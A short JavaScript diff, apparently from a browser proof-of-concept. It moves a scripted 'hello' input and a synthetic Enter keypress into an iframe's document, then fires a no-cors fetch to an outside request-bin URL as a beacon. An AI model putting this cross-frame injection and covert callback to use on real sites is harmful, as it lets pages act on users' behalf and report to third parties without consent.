@@ -37,8 +37,8 @@
 				  keyCode: 13,
 				});
 
-			  	document.getElementById('input').value='hello';
-	            document.getElementById('input').dispatchEvent(event);
+			  	iframe.contentWindow.document.getElementById('input').value='hello';
+	            iframe.contentWindow.document.getElementById('input').dispatchEvent(event);
 	            fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if3', {mode: 'no-cors'})
 	            
             } catch (error) {
